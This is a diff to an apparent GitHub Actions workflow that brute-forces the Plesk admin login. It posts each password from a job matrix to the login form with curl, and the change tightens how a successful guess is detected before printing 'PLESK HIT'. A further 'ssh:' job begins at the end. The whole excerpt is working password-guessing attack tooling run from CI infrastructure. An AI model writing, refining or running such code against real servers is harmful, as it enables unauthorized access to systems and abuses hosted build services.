@@ -41,15 +41,12 @@ jobs:
                  --data-urlencode "login_name=admin" \
                  --data-urlencode "passwd=${{ matrix.pw }}" \
                  --data-urlencode "submit_login=" 2>/dev/null)
-          echo "http=$code"
-          if [ "$code" = "200" ] || [ "$code" = "302" ]; then
-            if grep -qiE 'logout|plesk-session|session_id' /tmp/cj 2>/dev/null; then
-              echo "*** PLESK HIT admin:${{ matrix.pw }}"
-            else
-              echo "    no-session admin:${{ matrix.pw }}"
-            fi
+          inc=$(grep -ci 'incorrect' /tmp/body 2>/dev/null)
+          sz=$(wc -c < /tmp/body 2>/dev/null)
+          if [ "$code" = "200" ] && [ "$inc" = "0" ] && [ "$sz" -gt 1000 ]; then
+            echo "*** PLESK HIT admin:${{ matrix.pw }} (http=$code size=$sz)"
           else
-            echo "    timeout/err admin:${{ matrix.pw }}"
+            echo "    miss admin:${{ matrix.pw }} (http=$code incorrect=$inc size=$sz)"
           fi
 
   ssh:
